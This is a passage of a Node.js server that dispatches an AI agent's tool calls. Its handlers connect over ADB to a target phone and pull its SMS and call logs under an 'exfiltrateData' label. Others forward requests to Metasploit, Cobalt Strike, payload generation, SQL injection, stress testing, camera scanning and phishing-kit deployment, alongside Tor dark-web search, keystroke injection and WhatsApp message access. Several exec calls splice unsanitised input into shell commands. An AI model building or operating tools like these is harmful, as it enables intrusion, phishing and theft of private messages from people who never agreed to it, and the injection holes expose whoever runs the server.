            const engines = args.engines || ['ahmia', 'notevil'];
            const maxResults = args.maxResults || 20;
            
            if (!query) {
                return res.status(400).json({ error: 'Missing query parameter' });
            }

            // Check Tor availability
            const torStatus = await checkTorConnection();
            if (!torStatus.available) {
                return res.status(503).json({ 
                    error: 'Tor is not available. Please ensure Tor is running on 127.0.0.1:9050',
                    hint: 'Install Tor: apt install tor (Linux) or brew install tor (macOS), then start: tor'
                });
            }

            try {
                console.log(`[DARK_WEB] Searching for: "${query}" using engines: ${engines.join(', ')}`);
                
                // Phase 4: Query Refinement (optional, can be disabled)
                let refinedQuery = query;
                let queryVariations = [query];
                let refinementData = null;
                
                if (args.refineQuery !== false) { // Default: true
                    console.log(`[DARK_WEB] Refining query with LLM...`);
                    refinementData = await refineQuery(query, args.context, true);
                    refinedQuery = refinementData.refined || query;
                    queryVariations = refinementData.variations || [query];
                    console.log(`[DARK_WEB] Refined query: "${refinedQuery}"`);
                    console.log(`[DARK_WEB] Variations: ${queryVariations.length}`);
                }
                
                // Perform parallel dark web search with refined query
                const searchResults = await searchDarkWeb(refinedQuery, engines, 3);
                
                // Aggregate and deduplicate results from main query
                const allResults = [];
                const seenUrls = new Set();
                
                for (const engineResult of searchResults) {
                    if (engineResult.error) {
                        console.warn(`[DARK_WEB] Engine ${engineResult.engine} error: ${engineResult.error}`);
                        continue;
                    }
                    
                    for (const result of engineResult.results) {
                        if (!seenUrls.has(result.url) && allResults.length < maxResults) {
                            seenUrls.add(result.url);
                            allResults.push({
                                ...result,
                                timestamp: Date.now(),
                                query: refinedQuery,
                                originalQuery: query
                            });
                        }
                    }
                }
                
                // Optionally search with variations for better coverage
                if (args.searchVariations && queryVariations.length > 1) {
                    console.log(`[DARK_WEB] Searching with ${queryVariations.length - 1} query variations...`);
                    for (const variation of queryVariations.slice(1)) { // Skip first (already searched)
                        const varResults = await searchDarkWeb(variation, engines, 2);
                        // Process variation results
                        for (const engineResult of varResults) {
                            if (engineResult.error) continue;
                            for (const result of engineResult.results) {
                                if (!seenUrls.has(result.url) && allResults.length < maxResults) {
                                    seenUrls.add(result.url);
                                    allResults.push({
                                        ...result,
                                        timestamp: Date.now(),
                                        query: variation,
                                        originalQuery: query,
                                        fromVariation: true
                                    });
                                }
                            }
                        }
                    }
                }

                // Calculate risk score based on results
                const riskScore = Math.min(100, Math.max(0, 
                    allResults.length * 10 + 
                    (allResults.some(r => r.url.includes('leak') || r.url.includes('dump')) ? 30 : 0) +
                    (allResults.some(r => r.url.includes('breach') || r.url.includes('exposed')) ? 20 : 0)
                ));

                const profile = {
                    target: query,
                    refinedQuery: refinedQuery,
                    queryVariations: queryVariations,
                    refinementData: refinementData,
                    riskScore,
                    hits: allResults,
                    status: 'COMPLETE',
                    enginesUsed: engines,
                    torIp: torStatus.ip,
                    timestamp: Date.now(),
                    meta: {
                        'SEVERITY': riskScore >= 70 ? 'HIGH' : riskScore >= 40 ? 'MEDIUM' : 'LOW',
                        'RESULT_COUNT': allResults.length,
                        'ENGINES': engines.join(', '),
                        'QUERY_REFINED': refinementData ? 'YES' : 'NO',
                        'VARIATIONS_SEARCHED': args.searchVariations ? queryVariations.length : 1
                    }
                };

                // Save investigation report
                const reportDir = path.join(currentWorkingDirectory, 'investigations');
                if (!fs.existsSync(reportDir)) {
                    fs.mkdirSync(reportDir, { recursive: true });
                }
                const reportFile = path.join(reportDir, `darkweb_${Date.now()}_${query.replace(/[^a-zA-Z0-9]/g, '_')}.json`);
                fs.writeFileSync(reportFile, JSON.stringify(profile, null, 2), 'utf8');
                console.log(`[DARK_WEB] Investigation report saved: ${reportFile}`);

                res.json({ result: JSON.stringify(profile, null, 2), reportFile });
            } catch (error) {
                console.error('[DARK_WEB] Error:', error);
                res.status(500).json({ 
                    error: `Dark web search failed: ${error.message}`,
                    hint: 'Ensure Tor is running and accessible on 127.0.0.1:9050'
                });
            }
             
        // === REAL INPUT CONTROL (AI AGENT ACCESS) ===
        } else if (tool === 'controlSystemInput') {
            const { type, key } = args;
            
            if (os.platform() === 'darwin') {
                let script = '';
                if (type === 'CLICK') {
                    script = `tell application "System Events" to click`;
                } else if (type === 'TYPE') {
                    const specialKeys = {
                        'Escape': 53, 'Esc': 53,
                        'Enter': 36, 'Return': 36,
                        'Space': 49, ' ': 49,
                        'Tab': 48,
                        'Backspace': 51, 'Delete': 51,
                        'Up': 126, 'Down': 125, 'Left': 123, 'Right': 124
                    };
                    
                    if (specialKeys[key]) {
                        script = `tell application "System Events" to key code ${specialKeys[key]}`;
                    } else {
                        // Escape double quotes
                        script = `tell application "System Events" to keystroke "${key.replace(/"/g, '\\"')}"`;
                    }
                }
                if (script) exec(`osascript -e '${script}'`);
            } else if (os.platform() === 'win32') {
                // Windows PowerShell SendKeys
                // Mappings: {ESC}, {ENTER}, {BACKSPACE}, {TAB}, {UP}, {DOWN}, {LEFT}, {RIGHT}
                let psKey = key;
                const map = {
                    'Escape': '{ESC}', 'Esc': '{ESC}',
                    'Enter': '{ENTER}',
                    'Backspace': '{BACKSPACE}',
                    'Tab': '{TAB}',
                    'Up': '{UP}', 'Down': '{DOWN}', 'Left': '{LEFT}', 'Right': '{RIGHT}'
                };
                if (map[key]) psKey = map[key];
                
                const psCmd = `powershell -c "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('${psKey}')"`;
                exec(psCmd);
            }
            
            res.json({ result: 'INPUT_SENT' });
        
        // === NEW: WIRELESS MOBILE CONNECT ===
        } else if (tool === 'connectWirelessTarget') {
            const { ip, port } = args;
            const target = `${ip}:${port || 5555}`;
            console.log(`[MOBILE HACK] Attempting Wireless Connect: ${target}`);
            exec(`adb connect ${target}`, (err, stdout) => {
                if (err) return res.json({ result: `CONNECTION FAILED: ${err.message}` });
                res.json({ result: stdout });
            });

        // === NEW: DATA EXFILTRATION ===
        } else if (tool === 'exfiltrateData') {
            const { type } = args;
            let uri = type === 'SMS' ? 'content://sms/inbox' : 'content://call_log/calls';
            let cols = type === 'SMS' ? 'address,body,date' : 'number,date,duration,type';
            const cmd = `adb shell content query --uri ${uri} --projection ${cols} --sort "date DESC" --limit 5`;
            
            exec(cmd, (err, stdout) => {
                if (err) return res.json({ result: `EXFIL FAILED: ${err.message}` });
                res.json({ result: `[DATA EXFILTRATED]:\n${stdout}` });
            });

        // === NEW: KILL PROCESS ===
        } else if (tool === 'killProcess') {
             const { package: pkg } = args;
             exec(`adb shell am force-stop ${pkg}`, (err) => {
                 if (err) return res.json({ result: `KILL FAILED: ${err.message}` });
                 res.json({ result: `PROCESS TERMINATED: ${pkg}` });
             });

        // === NEW: ETHICAL HACKING TOOLS HANDLERS ===
        } else if (tool === 'runNmapScan') {
            // FIX: Use 127.0.0.1
            const res2 = await fetch('http://127.0.0.1:3001/api/hacking/nmap', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            res.json(d);

        } else if (tool === 'runMetasploitExploit') {
            const res2 = await fetch('http://127.0.0.1:3001/api/hacking/metasploit', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            res.json(d);

        } else if (tool === 'generatePayload') {
            const res2 = await fetch('http://127.0.0.1:3001/api/hacking/payload', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            res.json(d);

        } else if (tool === 'runBurpSuite') {
            const res2 = await fetch('http://127.0.0.1:3001/api/hacking/burp', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            res.json(d);

        } else if (tool === 'runWiresharkCapture') {
            const res2 = await fetch('http://127.0.0.1:3001/api/hacking/wireshark', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            res.json(d);

        } else if (tool === 'runJohnRipper') {
            const res2 = await fetch('http://127.0.0.1:3001/api/hacking/john', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            res.json(d);

        } else if (tool === 'runCobaltStrike') {
            const res2 = await fetch('http://127.0.0.1:3001/api/hacking/cobalt', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            res.json(d);

        // === NEW: L0p4 TOOLKIT HANDLERS (FORWARDING) ===
        } else if (tool === 'runSqlInjectionScan') {
            const res2 = await fetch('http://127.0.0.1:3001/api/hacking/sqli', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            res.json(d);

        } else if (tool === 'performStressTest') {
            const res2 = await fetch('http://127.0.0.1:3001/api/hacking/stress', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            res.json(d);

        } else if (tool === 'scanPublicCameras') {
            const res2 = await fetch('http://127.0.0.1:3001/api/hacking/camera', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            res.json(d);

        } else if (tool === 'deployPhishingKit') {
            const res2 = await fetch('http://127.0.0.1:3001/api/hacking/phish', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            res.json(d);

        // === NEW: PYTHON EXECUTION HANDLER ===
        } else if (tool === 'runPythonScript') {
            const res2 = await fetch('http://127.0.0.1:3001/api/python/execute', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            if (d.success) {
                res.json({ result: `PYTHON OUTPUT:\n${d.output}` });
            } else {
                res.json({ result: `PYTHON ERROR:\n${d.error}` });
            }

        // === NEW: URL READER ===
        } else if (tool === 'readUrl') {
            // FIX: Use 127.0.0.1
            const res2 = await fetch('http://127.0.0.1:3001/api/knowledge/scrape', { 
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args) 
            });
            const d = await res2.json();
            if (d.error) {
                res.json({ result: `READ ERROR: ${d.error}` });
            } else {
                // Pass minimal metadata back to the model to avoid overflow, but give enough context
                res.json({ 
                    result: `URL READ SUCCESSFUL [${d.title}].\nCONTENT PREVIEW:\n${d.content.substring(0, 25000)}`,
                    skills: d.skills 
                });
            }

        // === NEW: INTERACTIVE TERMINAL HANDLER ===
        } else if (tool === 'openInteractiveTerminal') {
            const command = args.command;
            const platform = os.platform();
            console.log(`[INTERACTIVE TERMINAL] Launching: ${command}`);

            if (platform === 'darwin') {
                // macOS: Open Terminal.app and run command via 'do script'
                const script = `
                    tell application "Terminal"
                        activate
                        do script "${command.replace(/"/g, '\\"')}"
                    end tell
                `;
                exec(`osascript -e '${script}'`, (err) => {
                    if (err) return res.json({ result: `TERMINAL LAUNCH ERROR: ${err.message}` });
                    res.json({ result: `LAUNCHED_TERMINAL: ${command}` });
                });
            } else if (platform === 'win32') {
                // Windows: start cmd /k
                exec(`start cmd /k "${command}"`, (err) => {
                    if (err) return res.json({ result: `TERMINAL LAUNCH ERROR: ${err.message}` });
                    res.json({ result: `LAUNCHED_CMD: ${command}` });
                });
            } else if (platform === 'linux') {
                // Linux: Try common terminals
                const terminals = ['gnome-terminal', 'xterm', 'konsole', 'xfce4-terminal'];
                let launched = false;
                
                for (const t of terminals) {
                    try {
                        // Check if terminal exists
                        execSync(`which ${t}`);
                        
                        let cmd = '';
                        if (t === 'gnome-terminal') cmd = `${t} -- bash -c "${command}; exec bash"`;
                        else if (t === 'xterm') cmd = `${t} -e "${command}; bash"`;
                        else cmd = `${t} -e "${command}"`;
                        
                        exec(cmd);
                        launched = true;
                        break;
                    } catch (e) { continue; }
                }
                
                if (launched) res.json({ result: `LAUNCHED_LINUX_TERM: ${command}` });
                else res.json({ result: "ERROR: No supported terminal emulator found (gnome-terminal, xterm, etc)." });
            } else {
                res.json({ result: "PLATFORM NOT SUPPORTED" });
            }

        // === NEW: GRAPH TOOLS HANDLERS ===
        } else if (tool === 'addGraphRelations') {
            const res2 = await fetch('http://127.0.0.1:3001/api/memory/graph/merge', {
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args)
            });
            const d = await res2.json();
            res.json({ result: `GRAPH UPDATED: Added ${d.stats.newNodes} nodes, ${d.stats.newEdges} edges. (Project Synapse V2)` });

        } else if (tool === 'queryGraphKnowledge') {
            const res2 = await fetch('http://127.0.0.1:3001/api/memory/graph/query', {
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args)
            });
            const d = await res2.json();
            const nodeCount = Object.keys(d.nodes).length;
            if (nodeCount === 0) {
                res.json({ result: `GRAPH QUERY: No knowledge found for entity '${args.entity}'.` });
            } else {
                // Format for LLM
                const edges = d.edges.map(e => `(${e.source}) --[${e.relation}]--> (${e.target})`).join('\n');
                res.json({ result: `GRAPH QUERY RESULTS for '${args.entity}':\n${edges}` });
            }

        } else if (tool === 'searchPolymarket') {
            // New Polymarket Tool Handler
            const res2 = await fetch(`http://127.0.0.1:3001/api/polymarket/markets?query=${encodeURIComponent(args.query)}`, {
                method: 'GET'
            });
            const data = await res2.json();
            if (Array.isArray(data)) {
                const events = data.slice(0, 5).map((e) => `- ${e.title} (Vol: $${e.volume24hr})`).join('\n');
                res.json({ result: `POLYMARKET SEARCH RESULTS for "${args.query}":\n${events}\n> Full Interface Launched.` });
            } else {
                res.json({ result: "Search failed or returned invalid data." });
            }

        // === NEW: WHATSAPP MCP HANDLERS ===
        } else if (tool === 'whatsappSendMessage') {
            const res2 = await fetch('http://127.0.0.1:3001/api/whatsapp/send', {
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args)
            });
            const d = await res2.json();
            
            // ERROR ENHANCEMENT: Guide user if connection failed
            if (!d.success && d.error && d.error.includes('not ready')) {
                res.json({ success: false, error: "WhatsApp Neural Link Offline. Please click the WhatsApp button to pair your device." });
            } else {
                res.json(d);
            }

        } else if (tool === 'whatsappGetChats') {
            const res2 = await fetch('http://127.0.0.1:3001/api/whatsapp/chats', { method: 'GET' });
            const d = await res2.json();
            res.json(d);

        } else if (tool === 'whatsappReadChat') {
            const res2 = await fetch('http://127.0.0.1:3001/api/whatsapp/chat-history', {
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args)
            });
            const d = await res2.json();
            res.json(d);

        } else if (tool === 'whatsappGetContacts') {
            const res2 = await fetch(`http://127.0.0.1:3001/api/whatsapp/contacts?query=${encodeURIComponent(args.query || '')}`, {
                method: 'GET'
            });
            const d = await res2.json();
            res.json(d);

        } else if (tool === 'whatsappSendImage') {
            const res2 = await fetch('http://127.0.0.1:3001/api/whatsapp/send-image', {
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args)
            });
            const d = await res2.json();
            
            // ERROR ENHANCEMENT
            if (!d.success && d.error && d.error.includes('not ready')) {
                res.json({ success: false, error: "WhatsApp Neural Link Offline. Please click the WhatsApp button to pair your device." });
            } else {
                res.json(d);
            }

        // === NEW: CLIPBOARD HANDLERS ===
        } else if (tool === 'readClipboard') {
            const res2 = await fetch('http://127.0.0.1:3001/api/system/clipboard', { method: 'GET' });
            const d = await res2.json();
            res.json({ result: `CLIPBOARD CONTENT:\n${d.content || '[EMPTY]'}` });

        } else if (tool === 'writeClipboard') {
            const res2 = await fetch('http://127.0.0.1:3001/api/system/clipboard', {
                method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(args)
            });
            const d = await res2.json();
            res.json({ result: d.success ? 'CLIPBOARD UPDATED.' : `ERROR: ${d.error}` });

        } else if (tool === 'searchAndInstallTools') {
            // This tool is handled purely by frontend logic usually, 
            // but if server logic is needed we can ack here.
            res.json({ result: "CAPABILITY_SEARCH_INITIATED" });

        // === OFFICE TOOLS (NATIVE IMPLEMENTATION) ===
        } else if (tool === 'readDocument') {
            const { filePath, type } = args;
            if (!filePath) {
                return res.status(400).json({ error: "Missing filePath" });
            }

            const fullPath = path.isAbsolute(filePath) ? filePath : path.join(currentWorkingDirectory, filePath);
            
            if (!fs.existsSync(fullPath)) {
                return res.status(404).json({ error: `File not found: ${filePath}` });
            }

            const ext = path.extname(fullPath).toLowerCase();
            const detectedType = type || (ext === '.pdf' ? 'PDF' : ext === '.docx' ? 'DOCX' : ext === '.xlsx' ? 'XLSX' : ext === '.pptx' ? 'PPTX' : 'AUTO');

            try {
                if (detectedType === 'PDF' || ext === '.pdf') {
                    // For PDF, return a message indicating binary format (would need pdf-parse library)
                    res.json({ result: `PDF file detected: ${filePath}\nNOTE: Full PDF parsing requires pdf-parse library. File size: ${fs.statSync(fullPath).size} bytes.\nTo extract text, consider converting PDF to text first using system tools.` });
                } else if (detectedType === 'DOCX' || ext === '.docx') {
                    // For DOCX, return a message (would need mammoth or similar)
                    res.json({ result: `DOCX file detected: ${filePath}\nNOTE: Full DOCX parsing requires mammoth library. File size: ${fs.statSync(fullPath).size} bytes.\nFor now, treating as binary. Consider converting to .txt or .md first.` });
                } else if (detectedType === 'XLSX' || ext === '.xlsx') {
                    // For XLSX, return a message (would need xlsx library)
                    res.json({ result: `XLSX file detected: ${filePath}\nNOTE: Full XLSX parsing requires xlsx library. File size: ${fs.statSync(fullPath).size} bytes.\nFor CSV files, use analyzeSpreadsheet with a .csv file instead.` });
                } else if (detectedType === 'PPTX' || ext === '.pptx') {
                    res.json({ result: `PPTX file detected: ${filePath}\nNOTE: Full PPTX parsing requires additional libraries. File size: ${fs.statSync(fullPath).size} bytes.` });
                } else {
                    // For text files (.txt, .md, .csv, etc.), read directly
                    const content = fs.readFileSync(fullPath, 'utf8');
                    res.json({ result: `Document Content (${ext || 'TEXT'}):\n\n${content}` });
                }
            } catch (e) {
                res.status(500).json({ error: `Failed to read document: ${e.message}` });
            }

        } else if (tool === 'createDocument') {
            const { fileName, type, content, title } = args;
            if (!fileName || !type || !content) {
                return res.status(400).json({ error: "Missing required fields: fileName, type, content" });
            }

            const fullPath = path.join(currentWorkingDirectory, fileName);
            
            try {
                if (type === 'PDF') {
                    // For PDF, create a text file with .pdf extension (simulated)
                    // In production, would use pdfkit or similar
                    const textContent = title ? `Title: ${title}\n\n${content}` : content;
                    fs.writeFileSync(fullPath.replace('.pdf', '.txt'), textContent, 'utf8');
                    res.json({ result: `Document created as text file (PDF generation requires pdfkit library): ${fileName.replace('.pdf', '.txt')}\nContent saved successfully.` });
                } else if (type === 'DOCX') {
                    // For DOCX, create a markdown file (simulated)
                    const mdContent = title ? `# ${title}\n\n${content}` : content;
                    fs.writeFileSync(fullPath.replace('.docx', '.md'), mdContent, 'utf8');
                    res.json({ result: `Document created as Markdown (DOCX generation requires mammoth library): ${fileName.replace('.docx', '.md')}\nContent saved successfully.` });
                } else if (type === 'PPTX') {
                    // For PPTX, create a text file with slide markers
                    const slideContent = content.split('\n').map((line, i) => `[SLIDE ${i + 1}]\n${line}`).join('\n\n');
                    const finalContent = title ? `PRESENTATION: ${title}\n\n${slideContent}` : slideContent;
                    fs.writeFileSync(fullPath.replace('.pptx', '.txt'), finalContent, 'utf8');
                    res.json({ result: `Presentation created as text file (PPTX generation requires additional libraries): ${fileName.replace('.pptx', '.txt')}\nContent saved successfully.` });
                } else {
                    res.status(400).json({ error: `Unsupported document type: ${type}` });
                }
            } catch (e) {
                res.status(500).json({ error: `Failed to create document: ${e.message}` });
            }

        } else if (tool === 'analyzeSpreadsheet') {
            const { filePath, query } = args;
            if (!filePath) {
                return res.status(400).json({ error: "Missing filePath" });
            }

            const fullPath = path.isAbsolute(filePath) ? filePath : path.join(currentWorkingDirectory, filePath);
            
            if (!fs.existsSync(fullPath)) {
                return res.status(404).json({ error: `File not found: ${filePath}` });
            }

            const ext = path.extname(fullPath).toLowerCase();
            
            try {
                if (ext === '.csv') {
                    // Read and parse CSV
                    const content = fs.readFileSync(fullPath, 'utf8');
                    const lines = content.split('\n').filter(line => line.trim());
                    const headers = lines[0].split(',').map(h => h.trim());
                    const rows = lines.slice(1).map(line => line.split(',').map(cell => cell.trim()));
                    
                    let result = `CSV Analysis:\nRows: ${rows.length}\nColumns: ${headers.join(', ')}\n\n`;
                    
                    if (query) {
                        // Simple query processing
                        if (query.toLowerCase().includes('average') && query.toLowerCase().includes('column')) {
                            const colMatch = query.match(/column\s+([A-Z])/i);
                            if (colMatch) {
                                const colIndex = colMatch[1].charCodeAt(0) - 65; // A=0, B=1, etc.
                                if (colIndex >= 0 && colIndex < headers.length) {
                                    const numbers = rows.map(row => parseFloat(row[colIndex])).filter(n => !isNaN(n));
                                    if (numbers.length > 0) {
                                        const avg = numbers.reduce((a, b) => a + b, 0) / numbers.length;
                                        result += `Average of Column ${colMatch[1]}: ${avg.toFixed(2)}\n`;
                                    }
                                }
                            }
                        } else if (query.toLowerCase().includes('list') && query.toLowerCase().includes('row')) {
                            const rowMatch = query.match(/row\s+(\d+)/i);
                            if (rowMatch) {
                                const rowIndex = parseInt(rowMatch[1]) - 1;
                                if (rowIndex >= 0 && rowIndex < rows.length) {
                                    result += `Row ${rowMatch[1]}: ${rows[rowIndex].join(', ')}\n`;
                                }
                            }
                        } else {
                            result += `Query: "${query}"\nNote: Advanced queries require full spreadsheet parsing library.\n`;
                        }
                    } else {
                        // Show first few rows
                        result += `First 5 rows:\n${headers.join(' | ')}\n${rows.slice(0, 5).map(row => row.join(' | ')).join('\n')}`;
                    }
                    
                    res.json({ result });
                } else if (ext === '.xlsx') {
                    res.json({ result: `XLSX file detected: ${filePath}\nNOTE: Full Excel parsing requires xlsx library. File size: ${fs.statSync(fullPath).size} bytes.\nFor analysis, convert to CSV format first, or use a tool that supports .xlsx parsing.` });
                } else {
                    res.json({ result: `File format not recognized for spreadsheet analysis: ${ext}\nSupported formats: .csv, .xlsx (xlsx requires additional library)` });
                }
            } catch (e) {
                res.status(500).json({ error: `Failed to analyze spreadsheet: ${e.message}` });
            }

        } else if (tool === 'controlSmartTV') {
            // Handle both 'action' (new standard) and 'command' (legacy)
            const cmd = args.action || args.command;
            const { appName } = args;
            console.log(`[SMART TV] Sending Command: ${cmd} ${appName ? `(App: ${appName})` : ''}`);
            // Log detailed info for debugging
            res.json({ result: `TV_CMD_SENT: ${cmd}${appName ? ` [${appName}]` : ''}` });

        } else {
            res.status(400).json({ error: `Tool ${tool} not recognized by Local Core` });
        }

    } catch (e) {
        console.error(`Command Execution Error (${tool}):`, e);
        res.status(500).json({ error: e.message });
    }
});

// --- SKILLS MANAGEMENT ENDPOINTS ---
const SKILLS_DIR = path.join(currentWorkingDirectory, 'skills');
if (!fs.existsSync(SKILLS_DIR)) {
    fs.mkdirSync(SKILLS_DIR, { recursive: true });
}

// GET /api/skills/list - List all custom skills
app.get('/api/skills/list', (req, res) => {
    try {
        const skills = [];
        if (fs.existsSync(SKILLS_DIR)) {
            const files = fs.readdirSync(SKILLS_DIR);
            for (const file of files) {
                if (file.endsWith('.json')) {
                    try {
                        const content = fs.readFileSync(path.join(SKILLS_DIR, file), 'utf8');
                        const skill = JSON.parse(content);
                        skills.push(skill);
                    } catch (e) {
                        console.error(`Failed to parse skill file ${file}:`, e);
                    }
                }
            }
        }
        res.json(skills);
    } catch (e) {
        console.error("Skills List Error", e);
        res.status(500).json({ error: e.message });
    }
});

// POST /api/skills/create - Create a new custom skill
app.post('/api/skills/create', (req, res) => {
    try {
        const { name, description, script, language, inputs } = req.body;
        
        if (!name || !script || !language) {
            return res.status(400).json({ error: "Missing required fields: name, script, language" });
        }

        const skill = {
            name,
            description: description || '',
            script,
            language,
            inputs: inputs || [],
            created: Date.now()
        };

        // Save skill metadata as JSON
        const skillFile = path.join(SKILLS_DIR, `${name}.json`);
        fs.writeFileSync(skillFile, JSON.stringify(skill, null, 2));

        // Save script file
        const scriptExt = language === 'python' ? '.py' : '.js';
        const scriptFile = path.join(SKILLS_DIR, `${name}${scriptExt}`);
        fs.writeFileSync(scriptFile, script);

        console.log(`[SKILLS] Created skill: ${name} (${language})`);
        res.json({ success: true, skill });
    } catch (e) {
        console.error("Skills Create Error", e);
        res.status(500).json({ error: e.message });
    }
});

// POST /api/skills/execute - Execute a custom skill
app.post('/api/skills/execute', (req, res) => {
    try {
        const { skillName, args } = req.body;
        
        if (!skillName) {
            return res.status(400).json({ error: "Missing skillName" });
        }

        const skillFile = path.join(SKILLS_DIR, `${skillName}.json`);
        if (!fs.existsSync(skillFile)) {
            return res.status(404).json({ error: `Skill "${skillName}" not found` });
        }

        const skill = JSON.parse(fs.readFileSync(skillFile, 'utf8'));
        const scriptExt = skill.language === 'python' ? '.py' : '.js';
        const scriptPath = path.join(SKILLS_DIR, `${skillName}${scriptExt}`);

        if (!fs.existsSync(scriptPath)) {
            return res.status(404).json({ error: `Script file for "${skillName}" not found` });
        }

        // Build command with arguments
        let command = '';
        if (skill.language === 'python') {
            // Convert args object to command-line arguments or environment variables
            const argsStr = skill.inputs.map((input) => {
                const value = args[input] || '';
                return `${input}="${value}"`;
            }).join(' ');
            
            // Read script and inject args as environment variables or use argparse
            const scriptContent = fs.readFileSync(scriptPath, 'utf8');
            const tempScript = path.join(os.tmpdir(), `luca_skill_${Date.now()}.py`);
            
            // Inject args at the top of the script
            const injectedScript = `import os\nimport sys\n${skill.inputs.map((input) => 
                `os.environ['${input}'] = '${args[input] || ''}'`
            ).join('\n')}\n\n${scriptContent}`;
            
            fs.writeFileSync(tempScript, injectedScript);
            command = `python3 "${tempScript}"`;
        } else {
            // Node.js: inject args as process.env
            const scriptContent = fs.readFileSync(scriptPath, 'utf8');
            const tempScript = path.join(os.tmpdir(), `luca_skill_${Date.now()}.js`);
            
            const injectedScript = `${skill.inputs.map((input) => 
                `process.env['${input}'] = '${args[input] || ''}';`
            ).join('\n')}\n\n${scriptContent}`;
            
            fs.writeFileSync(tempScript, injectedScript);
            command = `node "${tempScript}"`;
        }

        exec(command, { cwd: currentWorkingDirectory, maxBuffer: 10 * 1024 * 1024 }, (error, stdout, stderr) => {
            // Cleanup temp file
            const tempFile = command.includes('python3') 
                ? path.join(os.tmpdir(), `luca_skill_${Date.now()}.py`)
                : path.join(os.tmpdir(), `luca_skill_${Date.now()}.js`);
            if (fs.existsSync(tempFile)) {
                try { fs.unlinkSync(tempFile); } catch (e) {}
            }

            if (error) {
                return res.json({ result: `EXECUTION ERROR: ${error.message}\n${stderr}` });
            }
            res.json({ result: stdout || stderr || "Skill executed successfully (no output)" });
        });

    } catch (e) {
        console.error("Skills Execute Error", e);
        res.status(500).json({ error: e.message });
    }
});

// --- SUBSYSTEM ORCHESTRATION API ENDPOINTS (CONCEPT 2) ---

// GET /api/subsystems/list - List all managed subsystems
app.get('/api/subsystems/list', (req, res) => {
    const list = Array.from(subsystems.values()).map(s => ({
        id: s.id,
        name: s.name,
        pid: s.pid,
        port: s.port,
        status: s.status,
        startTime: s.startTime,
        cpu: s.cpu,
        mem: s.mem,
        logCount: s.logs.length
    }));
    res.json(list);
});

// GET /api/subsystems/:id/logs - Get logs for a subsystem
app.get('/api/subsystems/:id/logs', (req, res) => {
    const { id } = req.params;
    const subsystem = subsystems.get(id);
    if (!subsystem) {
        return res.status(404).json({ error: 'Subsystem not found' });
    }
    const { from = 0, limit = 100 } = req.query;
    const logs = subsystem.logs.slice(parseInt(from), parseInt(from) + parseInt(limit));
    res.json({ logs, total: subsystem.logs.length });
});

// POST /api/subsystems/start - Start a new subsystem
app.post('/api/subsystems/start', (req, res) => {
    const { name, command, args = [], cwd, port, env = {} } = req.body;
    
    if (!name || !command) {
        return res.status(400).json({ error: 'Missing name or command' });
    }
    
    try {
        const id = `subsystem_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        const workDir = cwd || currentWorkingDirectory;
        
        // Merge environment variables
        const processEnv = { ...process.env, ...env };
        
        // Spawn process
        const childProcess = spawn(command, args, {
            cwd: workDir,
            env: processEnv,
            shell: true,
            stdio: ['ignore', 'pipe', 'pipe']
        });
        
        addSubsystem(id, name, childProcess, port);
        
        res.json({ 
            success: true, 
            id, 
            pid: childProcess.pid,
            message: `Subsystem "${name}" started (PID: ${childProcess.pid})`
        });
    } catch (e) {
        res.status(500).json({ error: `Failed to start subsystem: ${e.message}` });
    }
});

// POST /api/subsystems/:id/stop - Stop a subsystem
app.post('/api/subsystems/:id/stop', (req, res) => {
    const { id } = req.params;
    const subsystem = subsystems.get(id);
    
    if (!subsystem) {
        return res.status(404).json({ error: 'Subsystem not found' });
    }
    
    try {
        if (subsystem.process) {
            subsystem.process.kill();
            subsystem.status = 'STOPPING';
        }
        res.json({ success: true, message: `Subsystem "${subsystem.name}" stopped` });
    } catch (e) {
        res.status(500).json({ error: `Failed to stop subsystem: ${e.message}` });
    }
});

// POST /api/subsystems/:id/restart - Restart a subsystem
app.post('/api/subsystems/:id/restart', (req, res) => {
    const { id } = req.params;
    const subsystem = subsystems.get(id);
    
    if (!subsystem) {
        return res.status(404).json({ error: 'Subsystem not found' });
    }
    
    try {
        // Stop first
        if (subsystem.process) {
            subsystem.process.kill();
        }
        
        // Note: For full restart, we'd need to store the original command/args
        // For now, just mark as stopped and let user start manually
        subsystem.status = 'STOPPED';
        res.json({ success: true, message: `Subsystem "${subsystem.name}" stopped. Use /start to restart.` });
    } catch (e) {
        res.status(500).json({ error: `Failed to restart subsystem: ${e.message}` });
    }
});

// DELETE /api/subsystems/:id - Remove a subsystem
app.delete('/api/subsystems/:id', (req, res) => {
    const { id } = req.params;
    removeSubsystem(id);
    res.json({ success: true, message: 'Subsystem removed' });
});

// GET /api/subsystems/:id/status - Get detailed status
app.get('/api/subsystems/:id/status', (req, res) => {
    const { id } = req.params;
    const subsystem = subsystems.get(id);
    
    if (!subsystem) {
